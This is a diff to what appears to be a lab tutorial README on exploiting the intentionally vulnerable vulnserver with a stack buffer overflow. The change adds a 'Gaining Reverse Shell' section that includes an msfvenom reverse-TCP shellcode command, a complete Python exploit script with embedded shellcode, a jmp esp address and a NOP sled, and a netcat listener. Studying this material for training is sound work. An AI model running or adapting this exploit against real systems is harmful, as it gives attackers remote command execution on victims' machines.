@@ -6,32 +6,36 @@
 
 Steps to conduct simple buffer overflow
 
-<a href="https://github.com/catx0rr/bof#installing-the-vuln-server">
+<a href="https://github.com/catx0rr/bufferoverflow/tree/master/vulnserver#installing-the-vuln-server">
 	Installation
 </a>
 <br />
-<a href="https://github.com/catx0rr/bof#spiking">
+<a href="https://github.com/catx0rr/bufferoverflow/tree/master/vulnserver#spiking">
 	Spiking
 </a>
 <br />
-<a href="https://github.com/catx0rr/bof#fuzzing">
+<a href="https://github.com/catx0rr/bufferoverflow/tree/master/vulnserver#fuzzing">
 	Fuzzing
 </a>
 <br />
-<a href="https://github.com/catx0rr/bof#finding-the-offset">
+<a href="https://github.com/catx0rr/bufferoverflow/tree/master/vulnserver#finding-the-offset">
 	Finding the Offset
 </a>
 <br />
-<a href="https://github.com/catx0rr/bof#overwriting-the-eip">
+<a href="https://github.com/catx0rr/bufferoverflow/tree/master/vulnserver#overwriting-the-eip">
 	Overwriting the EIP
 </a>
 <br />
-<a href="https://github.com/catx0rr/bof#finding-bad-characters">
+<a href="https://github.com/catx0rr/bufferoverflow/tree/master/vulnserver#finding-bad-characters">
 	Finding bad Characters
 </a>
 <br />
-<a href="https://github.com/catx0rr/bof#finding-the-right-module">
+<a href="https://github.com/catx0rr/bufferoverflow/tree/master/vulnserver#finding-the-right-module">
 	Finding the right module
+</a>
+<br />
+<a href="https://github.com/catx0rr/bufferoverflow/tree/master/vulnserver#gaining-reverse-shell>
+	Gaining reverse shell
 </a>
 
 ## Notes before starting
@@ -228,8 +232,6 @@ $(locate pattern_offset.rb) -l 3000 -q 386F4337
 ```python
 #!/usr/bin/python3
 
-# Overwriting the EIP
-
 import sys, socket
 
 host = '172.16.10.101'
@@ -281,8 +283,6 @@ for x in range(1,256):
 ```python
 #!/usr/bin/python
 
-# Finding Bad chars
-
 import sys, socket
 
 host = '172.16.10.101'
@@ -322,10 +322,10 @@ def inject_shellcode(host, port, payload):
 if __name__ == '__main__':
         inject_shellcode(host, port, shellcode)
 ```
-> Since vulnserver is running on 32bit, we'll change to python2 a bit further.
+> Since vulnserver is running on 32bit architecture, we'll change to python2 a bit further to avoid issues on the output of immunity and vulnserver
+
 > Executing the script, it will overflow again the TRUN and overwrite the EIP.
 > Follow the hex dump from the Instruction Pointer (ESP) to investigate for bad chars.
-
 
 ![follow_esp](https://github.com/catx0rr/bufferoverflow/blob/master/vulnserver/img/follow_esp.png)
 > On the tutorial, vulnserver has no bad characters (or maybe there is)
@@ -358,6 +358,7 @@ locate nasm_shell
 > this will be used as a jump instruction and point it to the malicious shellcode. Get the **FFE4**
 
 ![return_addresses](https://github.com/catx0rr/bufferoverflow/blob/master/vulnserver/img/return_addresses.png)
+![return_addresses](https://github.com/catx0rr/bufferoverflow/blob/master/vulnserver/img/break_point.png)
 
 > by entering the command on immunity: *!mona find -s "\xff\xe4" -m essfunc.dll*
 > we curated a list of return addresses and list them down to check what will work.
@@ -375,8 +376,6 @@ locate nasm_shell
 *shellcode.py*
 ```python
 #!/usr/bin/python
-
-# Generating malicious shellcode
 
 import sys, socket
 
@@ -418,7 +417,7 @@ On Immunity:
 - set the return address 625011af
 - press f2 after finding the jmp address (breakpoint)
 
-![break_point](https://github.com/catx0rr/bof/blob/master/img/break_point.png)
+![break_point](https://github.com/catx0rr/bufferoverflow/blob/master/vulnserver/img/break_point.png)
 
 > Execute the script
 
@@ -426,4 +425,87 @@ On Immunity:
 
 > Since the EIP is controlled, we can execute arbitrary code to take control of the system.
 
+## Gaining Reverse Shell
+
+> Generate the reverse tcp payload shellcode
+
+```shell
+msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.100 LPORT=1337 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
+*shellcode.py*
+```python
+#!/usr/bin/python
+
+import sys, socket
+
+host = '172.16.10.101'
+port = 9999
+
+payload = ("\xda\xcd\xbe\xb7\xf7\xc6\xae\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
+"\x52\x31\x73\x17\x03\x73\x17\x83\x5c\x0b\x24\x5b\x5e\x1c\x2b"
+"\xa4\x9e\xdd\x4c\x2c\x7b\xec\x4c\x4a\x08\x5f\x7d\x18\x5c\x6c"
+"\xf6\x4c\x74\xe7\x7a\x59\x7b\x40\x30\xbf\xb2\x51\x69\x83\xd5"
+"\xd1\x70\xd0\x35\xeb\xba\x25\x34\x2c\xa6\xc4\x64\xe5\xac\x7b"
+"\x98\x82\xf9\x47\x13\xd8\xec\xcf\xc0\xa9\x0f\xe1\x57\xa1\x49"
+"\x21\x56\x66\xe2\x68\x40\x6b\xcf\x23\xfb\x5f\xbb\xb5\x2d\xae"
+"\x44\x19\x10\x1e\xb7\x63\x55\x99\x28\x16\xaf\xd9\xd5\x21\x74"
+"\xa3\x01\xa7\x6e\x03\xc1\x1f\x4a\xb5\x06\xf9\x19\xb9\xe3\x8d"
+"\x45\xde\xf2\x42\xfe\xda\x7f\x65\xd0\x6a\x3b\x42\xf4\x37\x9f"
+"\xeb\xad\x9d\x4e\x13\xad\x7d\x2e\xb1\xa6\x90\x3b\xc8\xe5\xfc"
+"\x88\xe1\x15\xfd\x86\x72\x66\xcf\x09\x29\xe0\x63\xc1\xf7\xf7"
+"\x84\xf8\x40\x67\x7b\x03\xb1\xae\xb8\x57\xe1\xd8\x69\xd8\x6a"
+"\x18\x95\x0d\x3c\x48\x39\xfe\xfd\x38\xf9\xae\x95\x52\xf6\x91"
+"\x86\x5d\xdc\xb9\x2d\xa4\xb7\x69\xa1\xac\x23\x1a\xc0\xb0\xae"
+"\xe3\x4d\x56\xda\x03\x18\xc1\x73\xbd\x01\x99\xe2\x42\x9c\xe4"
+"\x25\xc8\x13\x19\xeb\x39\x59\x09\x9c\xc9\x14\x73\x0b\xd5\x82"
+"\x1b\xd7\x44\x49\xdb\x9e\x74\xc6\x8c\xf7\x4b\x1f\x58\xea\xf2"
+"\x89\x7e\xf7\x63\xf1\x3a\x2c\x50\xfc\xc3\xa1\xec\xda\xd3\x7f"
+"\xec\x66\x87\x2f\xbb\x30\x71\x96\x15\xf3\x2b\x40\xc9\x5d\xbb"
+"\x15\x21\x5e\xbd\x19\x6c\x28\x21\xab\xd9\x6d\x5e\x04\x8e\x79"
+"\x27\x78\x2e\x85\xf2\x38\x4e\x64\xd6\x34\xe7\x31\xb3\xf4\x6a"
+"\xc2\x6e\x3a\x93\x41\x9a\xc3\x60\x59\xef\xc6\x2d\xdd\x1c\xbb"
+"\x3e\x88\x22\x68\x3e\x99")
+
+nop_sled = "\x90" * 32
+
+shellcode = 'A' * 2003 + '\xaf\x11\x50\x62' + nop_sled + payload
+
+def inject_shellcode(host, port, payload):
+
+    while True:
+        try:
+            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+
+            s.send(('TRUN /.:/' + payload))
+            s.close()
+
+        except:
+            print "Error connecting to the server.."
+            sys.exit()
+
+
+if __name__ == '__main__':
+    inject_shellcode(host, port, shellcode)
+```
+
+> By generating the reverse shell shellcode we can execute commands to the target machine. The shellcode contains the summary:
+
+
+'A' * 2003 = Offset 
+
+'\xaf\x11\x50\x62 = jmp esp (625011af) which is the return address
+
+nop_sled = a padding. (\x90) skips until it reaches the next instruction
+
+payload = our reverse shell.
+
+```shell
+nc -lvp 1337
+```
+![listener](https://github.com/catx0rr/bufferoverflow/blob/master/vulnserver/img/listener.png)
+
+> Once the listener is setup, run vulnserver and execute the script.
+
+![pwned](https://github.com/catx0rr/bufferoverflow/blob/master/vulnserver/img/pwned.png)
 
